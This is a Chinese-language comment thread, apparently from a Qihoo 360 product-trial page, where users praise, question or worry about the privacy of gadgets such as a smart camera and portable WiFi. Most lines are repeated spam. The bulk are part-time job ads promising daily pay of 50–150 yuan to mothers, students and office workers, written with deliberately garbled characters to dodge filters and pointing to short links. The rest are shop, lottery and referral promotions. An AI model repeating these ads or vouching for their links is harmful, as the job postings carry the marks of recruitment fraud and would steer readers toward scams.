最好要有一定的夜视功能，在光线不足的情况下也能够正常工作
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～
电脑手机都是用的360  非常好  很实用，，希望试试这个超级摄像头！给个入选吧。。。
不错的产品和理念，很期待~
希望360防丢卫士用电子，声音大
一直用360一些产品，攒人品就看现在了。
我也想给宝宝试用下。期待产品正式出售，我家两个孩子有了这个可以随时看到他们在哪里心里就放心了。好东西快上市！
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～ 
再加上夜视功能，会更好
你是我的小丫小卫士，怎么爱你都不嫌多……快到碗里来
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
希望我能够拥有它360我的安全保镖。
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～ 
超赞有木有！！！！！！
还是方便得啊 
我每天跑步，如果有这个就太太太好了哇 
非常期待！
55555  good
看到楼主的小卖部WiFi，有些崩溃
fuck，，，i  like it 
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
打印RMB
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～ 
感谢360送的智键和随身wifi，不错的产品，很好用，谢谢！
至少现在是可以下载离线地图的，就是地图比较小，才几十M，可能手机里面的地图不够全，光靠手表或者GPS来判定，可能会比较难，不过应该是有办法的
come on
应该是有卖的了，给老人或者小孩用都不错
欢迎光临森丰箱包  http://url.cn/PVcRdy 有售旅行箱20寸22寸24寸 
理论上，位置点足够多的情况下，是可以完美模拟出当前路径的，不过就是要考虑功耗方面找个适当的点
欢迎光临森丰箱包  http://url.cn/PVcRdy 有售旅行箱20寸22寸24寸 
欢迎光临森丰箱包  http://url.cn/PVcRdy 有售旅行箱20寸22寸24寸 
据说已经量产了，网上我看到360工作人员发出了成箱成箱的照片哦，呵呵
电源线呢？？？
欢迎光临森丰箱包  http://url.cn/PVcRdy 有售旅行箱20寸22寸24寸 
支持360、守护360、因为他坚守我电脑的安全。
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
赞！很好！很强大！
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
欢迎光临森丰箱包  http://url.cn/PVcRdy 有售旅行箱20寸22寸24寸 
～不限制工作 时间， 做的越多 挣的越多 ～～（宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
  雪米尔无缝墙布有限公司（http://www.0731qb.com ）是一家集专业研发、消费、销售、施工的综合性生长型的无缝墙布公司。“雪米尔”品牌成立于2012年正式注册并且投入使用，是一家特地从事无缝墙布/阻燃墙布研发、消费及销售的企业。
第一次在360申请试用，期待如愿以偿！
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～   
第一次在360申请试用，期待如愿以偿！
期待中~抓紧时间啊啊
申请已经提交，期待中......................！！！！！！！！！！！！
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
产品好不错
非常垃圾哦
申请提交了，期待中呢！
在哪可以预约到啊
湖北地区360推广  联系： 李经理   15527335554    众多好礼相送
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
360的忠实支持者 
投放到大屏幕上已经有了，要是能直接投放到墙上或幕布上，而且画质清晰就好了。
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o，  我详细作讲解～  
要是电脑桌面也能监控就好了
小巧方便········· 
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
忠诚于360
提交申请，期待中，这次一定要选中我，我乃360的忠实粉丝啊。
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
估计要被歪用了，为以后的隐私感到担忧啊。
期待中.......
期待中。。。。。。真心觉得很不错！
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
好喜欢啊！！！
这是个赤裸裸的窃听监视设备，艾玛，不敢想象。
好想有一个
1元微购   www.weigou2014.com  
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
1元微购，只需1元，就有机会获得ipad、3G手机、笔记本电脑、单反等商品! www.weigou2014.com
好期待哟！！！
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
我申诉好多次咯，一次的木有中
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～ 
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～ 
希望惊喜到来
静静等待，希望有我！！
期待我说的附属功能，233
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
希望幸运能砸中我，期待……
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～ 
感觉不实，只能当玩具来用。
好期待好期待啊 360 我对你信心满满的，希望有好运气
中一个哈哈
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
用360抽奖  一年了   什么都没中过，希望这次能中！
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
非常漂亮、时尚、个性
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～ 
这不是在京东上面有人在卖了吗？？！！
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～ 
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
安全、灵便、放心
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
好玩！很有创意
免费领取互联网四大套装http://url.cn/NkhE91
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
呵呵 手机钱包一起丢了呢
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～   
期待中奖！！
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～   
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
这是真的方便了 还是又一个触屏电视~~
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
有人会去穿这个么 别逗了
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
百度放血了http://8.baidu.com/pk/ACYTrM 注册成功 激活 类似余额宝 可以中奖
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
就是热胶枪 只是干的快点
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
 双喜乐 百度放血了http://8.baidu.com/pk/ACYTrM 注册成功 激活 类似余额宝 可以中奖  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～ 
 双喜乐 百度放血了http://8.baidu.com/pk/ACYTrM 注册成功 激活 类似余额宝 可以中奖  
  百度放血了http://8.baidu.com/pk/ACYTrM 注册成功 激活 类似余额宝 可以中奖  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～ 
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～ 
  百度放血了http://8.baidu.com/pk/ACYTrM 注册成功 激活 类似余额宝 可以中奖  
真有这么神奇呀
真的好想有一个，经常掉东西呢
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
内地什么时候有货呀
发奖金是因为随身wifi不是因为这个智键好伐~
这么吊   ...
多少钱呢？1000元以内？
买来这个能有什么用 
期待，不知道什么时候到手
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
非常有创意的设计
好期待呢~~虽然机会不大。但是一切皆有可能
安全、灵便、放心 
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
希望该产品应该内置电池，防止停电，不影响工作
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
太酷了，真棒，真希望有
我想要一个
如果拿到试用wifi U盘可以和苹果手机上的app比较一下
不错，支持
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
很好啊，家中一切时时掌握在手中，祝360安全事业越做越好，恩！
好玩.喜欢.
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工澬每天結匴～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8s5dBA0 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～ 
我家用 360Wifi  是第一代 都用了 半年多了  就是在台式机用的  网速1M
手机可应用  你可以自己设密码
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
貌似很好，很强大！期待中......
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
酷帅霸炫吊啊！
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
zhichi!
这个必须赞，希望赶快研发
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
好傻的玩意......
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
太精干了。。。好东西
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
不错不错.
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
看起来好重啊.
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
～不限制工作 时间， 做的越多 挣的越多 ～～ （宝妈、学生、上班族都可以）【http://t.cn/8sfyr3p】复制到 浏览器打开 ～ ～ 每 夭 5o~ 15o， 我详细作讲解～  
诏搛耳只 工资每天結算～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【 http://t.cn/8sseZN4 】复制到 浏览器打开 ～即可报名咨询 ～每夭8o~15o，我详细作讲解～
